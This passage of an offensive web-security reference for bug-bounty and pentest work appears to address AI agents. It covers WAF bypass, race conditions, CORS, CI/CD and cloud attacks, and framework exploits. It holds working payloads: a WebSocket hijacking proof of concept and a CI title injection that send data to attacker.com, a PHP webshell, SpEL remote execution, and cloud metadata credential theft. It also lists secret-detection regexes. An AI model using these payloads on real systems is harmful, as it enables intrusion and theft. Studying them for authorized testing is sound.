HTTP Parameter Pollution (`id=1&id=2` — WAF inspects one occurrence, app uses another); **HTTP Request Smuggling** (CL.TE, TE.CL, TE.TE header obfuscation, plus modern H2.CL/H2.TE downgrade\[73\] and TE.0/CL.0 variants; detect with PortSwigger's HTTP Request Smuggler;\[74\] recent CVEs: HAProxy CVE-2024-53008, chunk-extension CVE-2025-55315);\[75\] chunked-transfer abuse; multipart boundary manipulation; Content-Type switching (`application/json` instead of `application/x-www-form-urlencoded`); and large-payload padding to overflow the WAF's inspection buffer (thousands of benign bytes before the injection).\[17\]

### 10.3 Logic-Based
Time-based/slow requests; case manipulation; comment insertion (SQL `/**/`, HTML `<!-- -->`, JS `//`); whitespace substitution; concatenation; protocol downgrade (HTTP/1.0, dropping `Host`).

## SECTION 11: RACE CONDITIONS & BUSINESS LOGIC

TOCTOU (time-of-check/time-of-use) at the HTTP layer:\[76\] the app checks state, then acts, with a microsecond window to slip a duplicate operation. Classic targets: coupon/promo/gift-card reuse, account-balance/double-spend, follow/like inflation, rate-limit and 2FA-OTP validation bypass. **The single-packet attack (James Kettle, PortSwigger, Black Hat USA 2023, "Smashing the state machine")** neutralizes network jitter: as Kettle states, "you can make 20-30 requests arrive at the server simultaneously - regardless of network jitter," by withholding the final frame bytes and releasing them together over HTTP/2 multiplexing (his Melbourne→Dublin benchmark achieved a median spread of 1ms, SD 0.3ms, where the single-packet attack succeeded after around 30 seconds while last-byte sync took over two hours); for HTTP/1.1 use last-byte synchronization.\[77\] **Turbo Intruder** (Burp extension) supports it natively — use `engine=Engine.BURP2` with `concurrentConnections=1`\[78\] and the `race-single-packet-attack.py` template;\[79\] or in Repeater, group ~20 duplicated requests\[79\] and "Send group (parallel)." Documented bounty findings include HackerOne flag-submission duplicate claims (#454949) and retest double-payouts (#604534).\[76\] For multi-endpoint races, use connection-warming requests to align windows.\[77\]

## SECTION 12: OPEN REDIRECT, CSRF, CORS

### Open Redirect
Parameters: `url=`, `redirect=`, `next=`, `return=`, `rurl=`, `dest=`, `destination=`, `redir=`, `redirect_uri=`, `redirect_url=`, `return_to=`, `checkout_url=`, `continue=`, `return_path=`, `go=`. Bypasses: `https://target.com@evil.com`, `https://target.com.evil.com`, backslash `https://target.com/redirect?url=\evil.com`, protocol-relative `//evil.com`, double-encoding, and `@`/`#` authority confusion. **High impact via chaining:** an open redirect on a whitelisted OAuth `redirect_uri` leaks the `code`/`access_token` → account takeover\[80\] (e.g., CVE-2026-27191 in feathersjs: `redirect` appended to origin without validation, `@attacker.com` yields `https://target.com@attacker.com#access_token=...`). \[81\] Detect with `rix4uni/redirectfinder` (`cat urls | redirectfinder`)\[82\] or the one-liner `gau host | grep =http | qsreplace 'http://evil.com' | httpx -fr | grep evil.com`.\[46\]\[83\]

### CSRF
Token bypass: remove the token parameter entirely, send an empty token, or switch HTTP method (GET instead of POST). Content-Type manipulation to send a "simple request" that avoids preflight. SameSite considerations (Lax allows top-level GET navigation; sites still vulnerable via method/flow gaps). JSON CSRF via an HTML form with `enctype=text/plain` or a tolerated `Content-Type`. OAuth CSRF via missing/!validated `state` parameter → forced account linking.

### CORS
Reflected `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true` = any site reads authenticated responses (account/API-key theft through a link, no XSS needed; `origin: true` in the Node `cors` package echoes any origin).\[84\] `null`-origin trust is forgeable via a sandboxed iframe (`‹iframe sandbox src="data:text/html,...">`) or `data:` URL.\[84\] Subdomain-wildcard trust and sloppy regex (`target.com.evil.com`, `eviltarget.com`). Test by replaying requests with `Origin: https://evil.com` and `Origin: null` and checking the reflected ACAO/ACAC headers.

## SECTION 13: CHAINING TECHNIQUES (ATTACK CHAINS)

For agents, model chains as primitive graphs where each node's output is the next node's precondition:
- **Open Redirect → SSRF → Internal Access:** server-side fetch follows a redirect from an allowed host to an internal/metadata target.
- **SSRF → Cloud Metadata → IAM keys → Full Compromise:** the highest-severity cloud chain; mitigated only by enforced IMDSv2 + hop limit 1 + least-privilege role.
- **LFI → Log Poisoning → RCE:** poison `access.log` via `User-Agent`, include it through the LFI sink (demonstrated end-to-end in HTB-style labs reaching a flag via `<?php system($_GET['cmd'])?>`).\[85\]
- **SQLi → File Read → Source Code → More Vulns:** `LOAD_FILE`/`INTO OUTFILE` to read config and plant a webshell.
- **XSS → CSRF → Account Takeover:** stored XSS executes a state-changing request (add attacker email) using the victim's session.\[86\]
- **IDOR → Information Disclosure → Privilege Escalation:** enumerate objects, harvest tokens/roles, escalate.
- **Subdomain Takeover → Cookie/Session Theft:** claim a dangling CNAME, serve attacker content under a trusted subdomain with a valid TLS cert,\[87\] scope cookies.
- **403 Bypass → Admin Panel → RCE:** path/header mutation reaches an admin function that uploads or executes.
- **GraphQL Introspection → Hidden Mutations → Data Manipulation:** schema dump reveals undocumented mutations lacking authorization.
- **OAuth open client registration + wildcard CORS + unvalidated redirect_uri → ATO:** several "low" issues compound into critical account takeover\[88\] (documented multiple times, $5,000+ bounties).

## SECTION 14: TOOLS REFERENCE

**Recon:** `subfinder` (passive subdomain enum), `amass` (passive/active enum), `assetfinder`, `httprobe`/`httpx` (live-host probing, tech-detect, status), `nuclei` (template scanner — `nuclei -tags takeover`,\[89\] `-t exposures/`), `ffuf`/`feroxbuster` (content discovery; feroxbuster recurses\[48\] and surfaces 401/403 by default), `dirsearch`, `gau`/`waybackurls` (archived URLs), `katana` (modern crawler, `-jc` for JS crawling), `naabu`/`nmap` (ports), `interactsh-client` (OOB/DNS-HTTP callback detection;\[90\] `interactsh-client -v` or pipe to `notify`).

**XSS:** `dalfox` (`cat urls.txt | dalfox pipe`,\[91\] blind with `-b https://your.xss.ht`), `XSStrike`, `kxss` (Emoe fork — flags params that reflect `" ' < >` unfiltered),\[92\] `Gxss` (`cat urls | Gxss -c 100 -p Xss`;\[46\]\[93\] note the author now recommends dalfox's discovery mode),\[94\] `bxss`/XSS Hunter for blind.

**SQLi:** `sqlmap` (tamper scripts `space2comment,between,randomcase,charencode,equaltolike`; `--list-tampers`), `ghauri` (`ghauri -u URL --dbs --batch`), `nosqli` for MongoDB.

**SSRF:** `SSRFmap` (`python ssrfmap.py -r req.txt -p url -m readfiles,portscan,redis,aws`),\[95\] `Gopherus` (`gopherus --exploit mysql|fastcgi|redis|smtp`).\[96\]

**Secrets:** `trufflehog` (verifies live creds — `trufflehog git file://. \[54\] --results=verified,unknown`), `gitleaks` (`gitleaks detect --source . -v`), `git-dumper` (`git-dumper http://site/.git ./out`), `SecretFinder`/`LinkFinder` for JS.

**403 Bypass:** `nomore403` (`./nomore403 -u https://target/admin -k headers,path-case,double-encoding -b 127.0.0.1`),\[5\] `byp4xx`, `403jump`, `4-ZERO-3/400OK`.

**LFI:** `dotdotpwn`, `lfifinder`, `php_filter_chain_generator.py`.

**Deserialization/RCE:** `ysoserial` (Java; remember `--add-opens` on modern JDKs), `ysoserial.net`, `jwt_tool` (JWT attacks), `JNDI-Exploit-Kit` (Log4Shell).

**Glue / pipeline:** `qsreplace` (replace\[97\] all query values + dedupe — `cat urls | qsreplace '"><svg onload=confirm(1)>'`), `gf` (Tomnomnom grep-pattern packs\[98\] — `gf xss|lfi|ssrf|redirect`), `uro` (declutter URL lists\[99\] — `cat urls | uro`), `anew`, `notify`.

**rix4uni suite (KrazePlanet / bugbountytips.krazeplanet.com author):** `GarudRecon` (full recon/vuln framework — `garudrecon mediumscope -d domain`),\[100\] `subdog` (17+-source subdomain aggregator, `--all` adds subfinder),\[47\] `paramfinder` (extracts hidden `<input>`/`<textarea>` params,\[101\] `cat urls | paramfinder`), `redirectfinder` (open-redirect scanner), `dotgitfinder` (exposed `.git/config` detector,\[102\] `cat subs | dotgitfinder`), plus `VulneraXSS`, `lfifinder`, `gosqli`/`sqlifinder`, `paramfinder`.

**Proxies/platforms:** Burp Suite (Repeater group-send for races, Turbo Intruder, HTTP Request Smuggler, Param Miner, InQL, nginx-alias-traversal extensions), Caido, mitmproxy.

---

## SECTION 15: CI/CD PIPELINE ATTACKS

### GitHub Actions Vulnerabilities

**Critical: `pull_request_target` + Checkout**
```yaml
# VULNERABLE: triggers in context of TARGET repo (has secrets access)
# but checks out ATTACKER's PR code
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v3  # checks out PR branch = attacker code
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install && npm test  # runs attacker's package.json scripts
```
- Find: Search GitHub for `pull_request_target` + `actions/checkout` + `head.sha`
- Impact: Attacker executes arbitrary code with access to `secrets.*`

**Expression Injection**
```yaml
# VULNERABLE: user-controlled value interpolated into shell
- run: echo "PR title: ${{ github.event.pull_request.title }}"
# Attack: title = "; curl attacker.com/?d=$(cat /etc/passwd)"
# Fix: use env var, never interpolate directly into run:
- run: echo "PR title: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

**Artifact Poisoning**
```
Workflow A (triggered by PR) → uploads build artifact
Workflow B (triggered by push to main, has secrets) → downloads artifact
Attack: Workflow A includes malicious script → Workflow B executes it
Grep: workflows that use upload-artifact/download-artifact across permission boundaries
```

**Self-Hosted Runners**
```bash
# Self-hosted runners persist state between jobs
# Attack: poison shared runner environment
# - Write to ~/.bashrc or runner hooks
# - Drop a malicious binary in PATH
# - Read secrets left by previous runs
# Find: repos where self-hosted runners are used for public PRs
grep -rn "runs-on: self-hosted" .github/workflows/
```

### GitLab CI Vulnerabilities
```yaml
# Shared runners with docker.sock → container escape
# Unprotected CI variables exposed to fork pipelines
# variables:
#   DB_PASSWORD: $CI_SECRET  # exposed in fork pipeline logs

# Fork pipeline trigger: protected vs unprotected jobs
# Protected: only runs on protected branches
# Unprotected: runs on fork branches = fork can read CI vars
```

### Jenkins
```
Groovy Script Console (usually at /script) → RCE if accessible
def cmd = "id".execute(); println cmd.text

Credential exposure:
- credentials.xml: encrypted credentials
- /credentials/store/system/domain/_/ — list all credentials
- Enumerate via: /api/json?tree=jobs[name,url]

Build log leakage: secrets in env vars logged to console output
```

---

## SECTION 16: WEBSOCKET SECURITY

### WebSocket Vulnerabilities
```javascript
// Cross-Site WebSocket Hijacking (CSWSH)
// No CSRF token on WebSocket handshake
// PoC HTML:
<script>
  var ws = new WebSocket('wss://target.com/chat');
  ws.onopen = function() {
    ws.send(JSON.stringify({type: "getHistory"}));
  };
  ws.onmessage = function(msg) {
    fetch('https://attacker.com/?d=' + btoa(msg.data));
  };
</script>
// Works if: cookies sent on handshake (SameSite=None or old Chrome behavior)
// + no Origin check server-side
```

**IDOR via WebSocket**
```javascript
// Change room_id or user_id in WebSocket message
ws.send(JSON.stringify({action: "getMessages", room_id: "victim_room_id"}));
```

**XSS via WebSocket Message**
```javascript
// Server reflects message content without encoding
ws.send("<img src=x onerror=alert(1)>");
// If server echoes to all clients without sanitization → stored XSS
```

**SQLi via WebSocket**
```javascript
ws.send(JSON.stringify({search: "' OR '1'='1"}));
ws.send(JSON.stringify({search: "' UNION SELECT username,password FROM users--"}));
```

**Privilege Escalation via WebSocket**
```javascript
// Change role in message
ws.send(JSON.stringify({action: "changeRole", user_id: 1337, role: "admin"}));
```

**Testing Checklist:**
```
□ Intercept WebSocket handshake in Burp — check Origin header
□ Send messages as different user — test IDOR
□ Inject HTML/JS in message content — XSS
□ SQLi/NoSQLi in search/filter params
□ No authentication on WebSocket connect itself?
□ CSWSH: can external origin initiate connection?
```

---

## SECTION 17: CLOUD MISCONFIGURATION

### AWS

**S3 Bucket Enumeration + Write**
```bash
# Enumerate buckets for target
aws s3 ls s3://target-company-bucket --no-sign-request
aws s3 cp test.txt s3://target-company-bucket/test.txt --no-sign-request
# Writable → stored XSS, phishing, or sensitive data access

# Check bucket policy
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request
```

**Cognito Misconfiguration**
```bash
# Self-registration enabled on internal Cognito pool
aws cognito-idp sign-up \
  --client-id <client_id> \
  --username attacker@evil.com \
  --password Passw0rd!

# Cognito gives JWT → access API as "authenticated user"
# Privilege escalation: check if user can assign themselves to groups
aws cognito-idp admin-add-user-to-group \
  --user-pool-id <pool_id> \
  --username attacker@evil.com \
  --group-name admin
```

**Lambda URL Unauthenticated**
```bash
# Lambda function URLs with AuthType NONE = public
curl https://<id>.lambda-url.<region>.on.aws/
# Check: does URL expose internal functionality?
```

**IMDSv1 from SSRF**
```
SSRF target: http://169.254.169.254/latest/meta-data/
Credentials: http://169.254.169.254/latest/meta-data/iam/security-credentials/
Full exfil:
  → /latest/meta-data/iam/security-credentials/<role-name>
  → Returns: AccessKeyId, SecretAccessKey, Token

IMDSv2 bypass attempts:
  curl -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
    -XPUT http://169.254.169.254/latest/api/token
  Then: curl -H "X-aws-ec2-metadata-token: <token>" \
    http://169.254.169.254/latest/meta-data/
  (Works only from EC2 instance; SSRF usually can't do 2-step)
```

### GCP

**Open Cloud Storage Buckets**
```bash
gsutil ls gs://target-bucket
curl https://storage.googleapis.com/target-bucket/
# Public bucket → list/read all objects
```

**Firebase Open Database**
```bash
# Firebase Realtime Database: append .json to URL
curl https://target.firebaseio.com/.json
curl https://target.firebaseio.com/users.json
# Writable without auth → data injection, stored XSS

# Firebase rules misconfiguration:
# ".read": true or ".write": true = public
```

**GCP Metadata Service**
```bash
# From SSRF on GCP instance:
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure

**Blob Storage Enumeration**
```bash
# Public blobs
curl https://<account>.blob.core.windows.net/<container>?restype=container&comp=list
# Lists all blobs in public container
```

**Azure AD User Enumeration**
```bash
# GetCredentialType endpoint — no auth required, confirms if email is registered
curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
  -H "Content-Type: application/json" \
  -d '{"username":"target@company.com"}'
# "IfExistsResult": 1 = user exists, 0 = doesn't exist
```

**Azure Metadata Service (SSRF)**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
  → Header required: Metadata: true
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com/
  → Returns: access_token (if managed identity configured)
```

---

## SECTION 18: SECRET DETECTION PATTERNS

### Regex Patterns for Secrets
```bash
# AWS Access Key
grep -rE "AKIA[0-9A-Z]{16}" .

# AWS Secret Access Key
grep -rE "(?i)aws.*secret.{0,30}[A-Za-z0-9/+]{40}" .

# Google API Key
grep -rE "AIza[0-9A-Za-z\\-_]{35}" .

# GitHub Personal Access Token
grep -rE "ghp_[A-Za-z0-9]{36}" .
grep -rE "github_pat_[A-Za-z0-9_]{82}" .

# GitHub OAuth / Classic
grep -rE "(gho|ghu|ghs|ghr)_[A-Za-z0-9]{36}" .

# Stripe Secret Key (live)
grep -rE "sk_live_[A-Za-z0-9]{24,}" .

# Stripe Publishable Key
grep -rE "pk_live_[A-Za-z0-9]{24,}" .

# Slack Token
grep -rE "xox[baprs]-[0-9]{12}-[0-9]{12}-[a-zA-Z0-9]{24}" .
grep -rE "xoxb-[0-9]+-[0-9]+-[a-zA-Z0-9]+" .

# SendGrid API Key
grep -rE "SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}" .

# JWT
grep -rE "eyJ[A-Za-z0-9_-]{20,}\.eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]+" .

# PEM Private Key
grep -rE "-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----" .

# Generic key=value
grep -rE "(api_key|apikey|api-key|secret|password|passwd|token|bearer|credential)['\"]?\s*[:=]\s*['\"][^'\"]{8,}" .
```

### Secret Scanning Commands
```bash
# trufflehog — git history + entropy
trufflehog git file:///path/to/repo
trufflehog github --repo https://github.com/target/repo

# gitleaks
gitleaks detect --source . --report-format json

# grep in JS files
grep -rn "api_key\|apiKey\|api-key\|secret\|token\|password" --include="*.js" . | grep -v "node_modules\|test\|spec"

# In decompiled APK / IPA
grep -rn "AKIA\|sk_live\|ghp_\|AIza" .
strings * | grep -E "(api|key|token|secret|password)" | grep -v "null\|empty\|placeholder"
```

### Cryptographic Material Detection
```bash
grep -rE "-----BEGIN.*PRIVATE KEY-----" .
grep -rE "-----BEGIN CERTIFICATE-----" .
# PGP
grep -rE "-----BEGIN PGP" .
```

### PII Patterns
```bash
# US Credit Card (Visa)
grep -rE "\b4[0-9]{12}(?:[0-9]{3})?\b" .
# US SSN
grep -rE "\b\d{3}-\d{2}-\d{4}\b" .
# Email
grep -rE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b" .
```

---

## SECTION 19: FRAMEWORK-SPECIFIC QUICK-HIT ATTACKS

### Next.js
```bash
# Server Actions CSRF (Next.js 13.4+)
# Server Actions bypass standard CSRF protections
# Test: call _action endpoint directly with cross-origin request

# _next/image SSRF (open redirect / SSRF via image optimizer)
/_next/image?url=http://attacker.com/x&w=1&q=1
/_next/image?url=http://169.254.169.254/latest/meta-data/&w=1&q=1

# Middleware bypass (middleware.ts doesn't run on _next/static)
/_next/static/../api/admin  # may bypass middleware checks

# __NEXT_DATA__ information disclosure
curl https://target.com/ | grep -o '__NEXT_DATA__.*</script>' | python3 -c "import json,sys; d=sys.stdin.read(); print(json.dumps(json.loads(d[d.find('{'): d.rfind('}')+1]), indent=2))"
# May contain API keys, session tokens, internal URLs in props

# Rewrites-based SSRF (next.config.js rewrites)
# If /api/proxy/:path rewrites to backend, try path traversal
/api/proxy/../../internal/admin
```

### Laravel
```bash
# CVE-2021-3129: Ignition RCE (Laravel < 8.4.2)
# Debug mode + vendor/facade/ignition exposed
POST /_ignition/execute-solution
{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
 "parameters": {"variableName": "...", "viewFile": "php://filter/..."}}

# Exposed management dashboards
/horizon        # Queue monitoring
/telescope      # Request/query/job logging (leaks all request data)
/nova           # Admin panel
/pulse          # App health metrics

# APP_KEY leak → forge cookies/sessions
grep -rn "APP_KEY" .env storage/logs/

# Mass assignment
# Any Eloquent model without $fillable or with $guarded = []
grep -rn "\$guarded\s*=\s*\[\]" app/Models/
```

### Spring Boot
```bash
# Actuator endpoints (Spring Boot < 2.0 without security config)
/actuator/env          # environment variables (secrets!)
/actuator/heapdump     # JVM heap dump (extract secrets with jmap)
/actuator/mappings     # all URL routes
/actuator/jolokia      # JMX operations (RCE via logback)
/actuator/loggers      # change log levels (verbose logging leaks)

# SpEL injection (Spring Expression Language)
# In @Value, @PreAuthorize, Thymeleaf templates
${T(java.lang.Runtime).getRuntime().exec("id")}
#{T(java.lang.Runtime).getRuntime().exec("id")}

# Thymeleaf SSTI
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
```

### Django
```bash
# Debug toolbar (/djdt/sql/ shows all queries with params)
curl https://target.com/djdt/sql/

# SECRET_KEY in settings → forge CSRF tokens and session cookies
grep -rn "SECRET_KEY" .

# ORM __ lookup injection
# If user input passed to filter():
?username=admin__password__startswith=a  # time-based extraction

# Admin panel enumeration
/admin/  # Django admin — try default creds
/admin/auth/user/  # list all users if logged in
```

### Ruby on Rails
```bash
# YAML deserialization RCE (Ruby < 3.1)
# Marshal.load / YAML.load with user input
# Gadget chains: activesupport-7.0.6 (CodeGadget, AnyObject)

# Mass assignment
# attr_accessible removed in Rails 4+ but legacy apps may use it
grep -rn "params\.permit\|params\[:user\]\|update_attributes" app/

# SECRET_KEY_BASE in environment
grep -rn "SECRET_KEY_BASE" config/

# send_file path traversal
# If controller does: send_file params[:file]
# Try: ?file=../../../etc/passwd
```

## Caveats
- **Authorized testing only.** Every technique here is for use strictly within an in-scope, authorized bug bounty or pentest engagement. Many payloads (webshell upload, `xp_cmdshell`, `$where` busy-loops) can damage or DoS a target; prefer non-destructive proofs (`id`, `sleep`, arithmetic, OOB callback) and never run `rm`/`shutdown`/destructive SQL.
- **Source quality varies.** Canonical mechanics (PortSwigger Web Security Academy, OWASP, PayloadsAllTheThings, HackTricks, tool README/docs) are high-confidence. Some payloads and "works in 2026" claims come from individual Medium/DEV/substack write-ups and vendor blogs; treat specific bounty dollar amounts, WAF-version-specific bypasses, and star counts as point-in-time and verify before relying on them.
- **Forward-looking/unconfirmed items are flagged:** DOMPurify CVE-2025-26791, PHP `session.upload_progress` UAF (CVE-2026-109618/109619), Spring Boot heapdump CVE-2026-40976, feathersjs CVE-2026-27191, and HAProxy/chunk-extension smuggling CVEs are cited from advisory/blog sources dated 2025–2026 and should be re-verified against NVD/vendor advisories before weaponization.
- **Defenses move the baseline.** Enforced IMDSv2 (hop limit 1), strict nonce/hash CSP without `unsafe-inline`, algorithm-pinned JWT verification, per-field GraphQL authorization, persisted-query allowlists, server-side image re-encoding, and `root`-over-`alias` nginx configs each neutralize entire technique families above; agents should test for the presence of these controls first to avoid wasted effort.
- **WAF noise vs. true positives.** Status-code or length changes alone are unreliable — always corroborate with body-hash diffs and out-of-band confirmation (interactsh/Collaborator) before reporting, especially for blind SSRF, blind SQLi, blind command injection, and blind XSS.
